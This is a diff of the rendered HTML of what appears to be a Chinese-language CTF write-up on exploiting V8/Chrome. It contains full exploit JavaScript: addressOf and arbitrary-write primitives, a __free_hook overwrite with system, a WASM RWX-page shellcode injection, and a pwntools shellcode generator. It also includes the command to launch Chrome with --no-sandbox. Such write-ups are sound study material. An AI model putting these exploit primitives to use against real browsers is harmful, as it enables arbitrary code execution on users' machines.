 	<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>最后使用 <code>write64_view</code> 代替 <code>write64</code> 即可</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">//%SystemBreak();</span>
@@ -698,7 +704,6 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 恢复 __free_hook 使得程序正常退出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>完整 exp 如下：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> obj_array <span class="token operator">=</span> <span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -834,10 +839,12 @@ console<span class="token punctuation">.</span><span class="token function">log<
 <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>成功执行命令弹出计算器：<br><img src="/images/3b546c3b/pasted-27.png" alt="pwn1"></p>
+<p>成功执行命令弹出计算器：<br>
+<img src="/images/3b546c3b/pasted-27.png" alt="pwn1"></p>
 <p>题目的 chrome 可执行文件，got 表的偏移不太一样，修改后，泄露地址都是正确的，但是不知道为什么这种方式没有成功弹出计算器</p>
-<h4 id="非传统利用方式"><a href="#非传统利用方式" class="headerlink" title="非传统利用方式"></a>非传统利用方式</h4><p>另一种方式和 WASM 有关系，首先利用这个网站 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://wasdk.github.io/WasmFiddle/，生成一段">https://wasdk.github.io/WasmFiddle/，生成一段</a> wasm<br><img src="/images/3b546c3b/pasted-28.png" alt="pwn2_1"></p>
+<h4 id="非传统利用方式">非传统利用方式</h4>
+<p>另一种方式和 WASM 有关系，首先利用这个网站 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://wasdk.github.io/WasmFiddle/%EF%BC%8C%E7%94%9F%E6%88%90%E4%B8%80%E6%AE%B5">https://wasdk.github.io/WasmFiddle/，生成一段</a> wasm<br>
+<img src="/images/3b546c3b/pasted-28.png" alt="pwn2_1"></p>
 <p>调试下面代码</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -849,13 +856,17 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>可以看到，执行了 WASM 输出了 main 函数的返回值 42<br><img src="/images/3b546c3b/pasted-29.png" alt="pwn2_2"></p>
+<p>可以看到，执行了 WASM 输出了 main 函数的返回值 42<br>
+<img src="/images/3b546c3b/pasted-29.png" alt="pwn2_2"></p>
 <p>但是 WASM 肯定是不能想执行什么就执行什么的，浏览器是不允许 WASM 直接调用系统函数的，只能做一些数学计算等，但是 WASM 管理了一块 RWX 属性的内存段，每当调用 WASM 的函数，都会从这里开始执行指令，如果将这里改写为构造好的 shellcode，那么就可以达成执行任意 shellcode 的目的了</p>
-<p>这里调试跟踪一下这块 RWX 内存的位置，首先查看 main 函数对象，找到 shared_info<br><img src="/images/3b546c3b/pasted-30.png" alt="pwn2_3"></p>
-<p>再通过 shared_info 找到 data<br><img src="/images/3b546c3b/pasted-31.png" alt="pwn2_4"></p>
-<p>再通过 data 找到 instance<br><img src="/images/3b546c3b/pasted-32.png" alt="pwn2_5"></p>
-<p>在 instance 的固定偏移处可以找到这个 RWX 段的地址，这个固定偏移因编译参数环境等而异，本道题目则是 <code>+0x88</code><br><img src="/images/3b546c3b/pasted-33.png" alt="pwn2_6"></p>
+<p>这里调试跟踪一下这块 RWX 内存的位置，首先查看 main 函数对象，找到 shared_info<br>
+<img src="/images/3b546c3b/pasted-30.png" alt="pwn2_3"></p>
+<p>再通过 shared_info 找到 data<br>
+<img src="/images/3b546c3b/pasted-31.png" alt="pwn2_4"></p>
+<p>再通过 data 找到 instance<br>
+<img src="/images/3b546c3b/pasted-32.png" alt="pwn2_5"></p>
+<p>在 instance 的固定偏移处可以找到这个 RWX 段的地址，这个固定偏移因编译参数环境等而异，本道题目则是 <code>+0x88</code><br>
+<img src="/images/3b546c3b/pasted-33.png" alt="pwn2_6"></p>
 <p>最后代码如下：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'f_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>f_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -884,7 +895,6 @@ console<span class="token punctuation">.</span><span class="token function">log<
 <span class="token comment">//%SystemBreak();</span>
 
 <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//pwn</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>然后就差 shellcode 了，这里写了一个脚本用来生成 shellcode，代码如下：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
@@ -934,7 +944,6 @@ data <span class="token operator">=</span> asm<span class="token punctuation">(<
 data <span class="token operator">=</span> just8<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
 
 <span class="token keyword">print</span><span class="token punctuation">(</span>to_js<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>要注意的是，很多初学者都会遇到一个问题，execve 没法弹计算器，这是因为执行图形程序需要一个环境变量 DISPLAY，用来指定图形输出的设备，一般情况下写 <code>DISPLAY=:0</code> 即可</p>
 <p>最终完整 exp 如下：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
@@ -1069,7 +1078,6 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>写成 html 文件，让 chrome 打开：</p>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
 
@@ -1206,12 +1214,12 @@ console<span class="token punctuation">.</span><span class="token function">log<
 <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>chrome 打开记得关闭沙箱，因为沙箱的安全机制，让程序无法执行一些系统调用，本题的考点也没有绕过沙箱，只需要在无沙箱情况下成功 pwn 即可：</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./chrome --no-sandbox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>成功执行 shellcode 弹出计算器<br><img src="/images/3b546c3b/pasted-36.png" alt="pwn2"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<p>成功执行 shellcode 弹出计算器<br>
+<img src="/images/3b546c3b/pasted-36.png" alt="pwn2"></p>
+<h2 id="参考">参考</h2>
+<ul>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://migraine-sudo.github.io/2020/02/15/v8/">https://migraine-sudo.github.io/2020/02/15/v8/</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://skylerlee.github.io/codelet/2017/03/08/build-v8/">https://skylerlee.github.io/codelet/2017/03/08/build-v8/</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></li>
@@ -1312,13 +1320,13 @@ console<span class="token punctuation">.</span><span class="token function">log<
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">380k</span>
+    <span title="站点总字数">379k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:46</span>
+    <span title="站点阅读时长">5:45</span>
   </span>
 </div>
 <div class="busuanzi-count">
